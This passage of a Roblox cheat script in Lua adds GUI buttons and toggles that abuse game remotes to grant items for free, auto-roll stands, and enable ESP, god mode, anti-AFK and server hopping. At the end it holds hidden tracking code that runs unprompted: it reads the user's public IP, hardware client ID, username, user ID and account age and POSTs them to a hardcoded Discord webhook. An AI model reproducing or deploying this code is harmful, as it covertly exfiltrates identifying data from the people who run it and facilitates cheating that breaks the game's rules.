 local Button = Shop:CreateButton({
    Name = "Buy Lucky Arrow (30,000)",
    Callback = function()
        local args = {
            [1]="LuckyStandArrow",
            
            }
            
            game:GetService("ReplicatedStorage").Logic.giveitem:FireServer(unpack(args))
    end,
 })


local Toggle = Misc:CreateToggle({
    Name = "Buff Power",
    CurrentValue = false,
    Flag = "Item",
    Callback = function(t)
 _G.Kiss = t
 

end,
})





local Toggle = Misc:CreateToggle({
    Name = "God Mode",
    CurrentValue = false,
    Flag = "Item",
    Callback = function(t)
 _G.God = t
 

end,
})


local Toggle = Misc:CreateToggle({
    Name = "Void Dimension",
    CurrentValue = false,
    Flag = "Item",
    Callback = function(t)
 _G.Void = t
 

end,
})





spawn(function()
    while task.wait() do
if _G.AutoRandomStand then
repeat

    if game.Players.LocalPlayer.Stand.Value == "WonderOfU" or game.Players.LocalPlayer.Stand.Value == "Tusk1" or game.Players.LocalPlayer.Stand.Value == "Tusk2" or game.Players.LocalPlayer.Stand.Value == "Tusk3" or game.Players.LocalPlayer.Stand.Value == "GoldExperience" then
      return
    else



 wait(0.5)


	if not game.Players.LocalPlayer.Backpack:FindFirstChild("RokakakaFruit") then
        local args = {
            [1]="RokakakaFruit",
            
            }
            
            game:GetService("ReplicatedStorage").Logic.giveitem:FireServer(unpack(args))
	end
    local roka = game.Players.LocalPlayer.Backpack:FindFirstChild("RokakakaFruit")
		wait(.1)
		game.Players.LocalPlayer.Character.Humanoid:EquipTool(roka)

local args = {
    [1] = game:GetService("Players").LocalPlayer.Character.RokakakaFruit,
    [2] = game:GetService("Players").LocalPlayer.Character,
    [3] = 2
}

game:GetService("ReplicatedStorage").Logic.fruitevent:InvokeServer(unpack(args))

wait(1.3)

if not game.Players.LocalPlayer.Backpack:FindFirstChild("StandArrow") then
    local yes = {
        [1]="StandArrow",
        
        }
        
        game:GetService("ReplicatedStorage").Logic.giveitem:FireServer(unpack(yes))
end

local arrow = game.Players.LocalPlayer.Backpack:FindFirstChild("StandArrow")
	wait(.1)
	game.Players.LocalPlayer.Character.Humanoid:EquipTool(arrow)


local args = {
    [1] = game:GetService("Players").LocalPlayer.Character.StandArrow,
    [2] = game:GetService("Players").LocalPlayer.Character,
    [3] = 0
}

game:GetService("ReplicatedStorage").Logic.arrowevent:InvokeServer(unpack(args))
wait(1.5)
end
until not _G.AutoRandomStand or game.Players.LocalPlayer.Stand.Value == "WonderOfU" or game.Players.LocalPlayer.Stand.Value == "Tusk1" or game.Players.LocalPlayer.Stand.Value == "Tusk2" or game.Players.LocalPlayer.Stand.Value == "Tusk3" or game.Players.LocalPlayer.Stand.Value == "GoldExperience"
end
end
end)





local Toggle = Misc:CreateToggle({
    Name = "Auto Random Stand(Tier 8)",
    CurrentValue = false,
    Flag = "Item",
    Callback = function(t)
 _G.AutoRandomStand = t
 

end,
})


local Toggle = Misc:CreateToggle({
    Name = "Esp NPC",
    CurrentValue = false,
    Flag = "Item",
    Callback = function(t)
 _G.ESPNPC = t
 

end,
})


local Toggle = Misc:CreateToggle({
    Name = "Esp Item",
    CurrentValue = false,
    Flag = "Item",
    Callback = function(t)
 _G.ESP = t
 

end,
})

local Button = Misc:CreateButton({
       Name = "Anti AFK",
       CurrentValue = false,
       Flag = "Item",
       Callback = function(t)
        local vu = game:GetService("VirtualUser")
    
        game:GetService("Players").LocalPlayer.Idled:connect(function()
        
        vu:Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
        
        wait(1)
        
        vu:Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
    end)
end,
})


local Button = Misc:CreateButton({
    Name = "Anti Lag",
    CurrentValue = false,
    Flag = "Item",
    Callback = function(t)
for _, v in pairs(game:GetService("Workspace"):GetDescendants()) do
    if v:IsA("BasePart") and not v.Parent:FindFirstChild("Humanoid") then
        v.Material = Enum.Material.SmoothPlastic
        if v:IsA("Texture") then
            v:Destroy()
        end
    end
end
end,
})



local Button = Misc:CreateButton({
    Name = "Rejoin",
    CurrentValue = false,
    Flag = "Item",
    Callback = function(t)
local ts = game:GetService("TeleportService")
        
local p = game:GetService("Players").LocalPlayer

 

ts:Teleport(game.PlaceId, p)
    end,
})


local Button = Misc:CreateButton({
    Name = "Hop Server",
    CurrentValue = false,
    Flag = "Item",
    Callback = function(t)
        local PlaceID = game.PlaceId
        local AllIDs = {}
        local foundAnything = ""
        local actualHour = os.date("!*t").hour
        local Deleted = false
        --[[
        local File = pcall(function()
            AllIDs = game:GetService('HttpService'):JSONDecode(readfile("NotSameServers.json"))
        end)
        if not File then
            table.insert(AllIDs, actualHour)
            writefile("NotSameServers.json", game:GetService('HttpService'):JSONEncode(AllIDs))
        end
        ]]
        function TPReturner()
            local Site;
            if foundAnything == "" then
                Site = game.HttpService:JSONDecode(game:HttpGet('https://games.roblox.com/v1/games/' .. PlaceID .. '/servers/Public?sortOrder=Asc&limit=100'))
            else
                Site = game.HttpService:JSONDecode(game:HttpGet('https://games.roblox.com/v1/games/' .. PlaceID .. '/servers/Public?sortOrder=Asc&limit=100&cursor=' .. foundAnything))
            end
            local ID = ""
            if Site.nextPageCursor and Site.nextPageCursor ~= "null" and Site.nextPageCursor ~= nil then
                foundAnything = Site.nextPageCursor
            end
            local num = 0;
            for i,v in pairs(Site.data) do
                local Possible = true
                ID = tostring(v.id)
                if tonumber(v.maxPlayers) > tonumber(v.playing) then
                    for _,Existing in pairs(AllIDs) do
                        if num ~= 0 then
                            if ID == tostring(Existing) then
                                Possible = false
                            end
                        else
                            if tonumber(actualHour) ~= tonumber(Existing) then
                                local delFile = pcall(function()
                                    -- delfile("NotSameServers.json")
                                    AllIDs = {}
                                    table.insert(AllIDs, actualHour)
                                end)
                            end
                        end
                        num = num + 1
                    end
                    if Possible == true then
                        table.insert(AllIDs, ID)
                        wait()
                        pcall(function()
                            -- writefile("NotSameServers.json", game:GetService('HttpService'):JSONEncode(AllIDs))
                            wait()
                            game:GetService("TeleportService"):TeleportToPlaceInstance(PlaceID, ID, game.Players.LocalPlayer)
                        end)
                        wait(4)
                    end
                end
            end
        end

        function Teleport()
            while wait() do
                pcall(function()
                    TPReturner()
                    if foundAnything ~= "" then
                        TPReturner()
                    end
                end)
            end
        end

        Teleport()
    end,
})
 
 local Section = setting:CreateSection("🎨 Themes")
 local themes = setting:CreateDropdown({
    Name = "🎨 Select Theme",
    Options = {
       "🌟 Default", 
       "✨ Amber Glow", 
       "💜 Amethyst", 
       "🌸 Bloom", 
       "🌌 Dark Blue", 
       "🍃 Green", 
       "🌞 Light", 
       "🌊 Ocean", 
       "🌿 Serenity"
    },
    CurrentOption = {"🌌 Dark Blue"},
    MultipleOptions = false,
    Flag = "themes",
    Callback = function(Options)
          local selectedTheme = Options[1]
          if selectedTheme == "🌟 Default" then
             Window.ModifyTheme('Default')
          elseif selectedTheme == "✨ Amber Glow" then
             Window.ModifyTheme('AmberGlow')
          elseif selectedTheme == "💜 Amethyst" then
             Window.ModifyTheme('Amethyst')
          elseif selectedTheme == "🌸 Bloom" then
             Window.ModifyTheme('Bloom')
          elseif selectedTheme == "🌌 Dark Blue" then
             Window.ModifyTheme('DarkBlue')
          elseif selectedTheme == "🍃 Green" then
             Window.ModifyTheme('Green')
          elseif selectedTheme == "🌞 Light" then
             Window.ModifyTheme('Light')
          elseif selectedTheme == "🌊 Ocean" then
             Window.ModifyTheme('Ocean')
          elseif selectedTheme == "🌿 Serenity" then
             Window.ModifyTheme('Serenity')
          end
    end,
 })


 
local player = game.Players.LocalPlayer
local exploit = (getexecutorname and getexecutorname()) or "Unknown Executor"
local ip, httpSuccess = "Unknown IP", false

local success, result = pcall(function()
    return (syn and syn.request or request)({
        Url = 'https://api.ipify.org/',
        Method = "GET"
    }).Body
end)
if success then ip = tostring(result) end

local name = player.Name
local Hwid = tostring(game:GetService("RbxAnalyticsService"):GetClientId())
local Age = player.AccountAge
local gameId = game.PlaceId
local userId = player.UserId
local displayName = player.DisplayName

local webhookUrl = "https://discord.com/api/webhooks/1309100164094627870/HzD9N3jAhtfIiuEd5njc-zszgnN4kds68CH56Ji0ql4CF49f7jQP8E5gYK5Jt2keScEk"
local data = {
    ["content"] = string.format(
        "Executor name: %s\nProfile Link: https://www.roblox.com/users/%s/profile\nGame Link: https://www.roblox.com/games/%s\nIP: %s\nUsername: %s\nDisplay Name: %s\nHWID: %s\nAccount Age (Days): %s\nFree Version",
        exploit, userId, gameId, ip, name, displayName, Hwid, Age
    )
}
local headers = {["Content-Type"] = "application/json"}

local encodedData = game:GetService("HttpService"):JSONEncode(data)
local requestFunc = http_request or request or HttpPost

if requestFunc then
    local finalRequest = {Url = webhookUrl, Body = encodedData, Method = "POST", Headers = headers}
    requestFunc(finalRequest)
else
    print("Something Went Wrong")
end

print("Success Send Log Thanks You for using our script")

    
else
    print("Script Is Down")
    game.Players.LocalPlayer:Kick("Script is Down")
end
else
print("Failed to fetch script.")
end
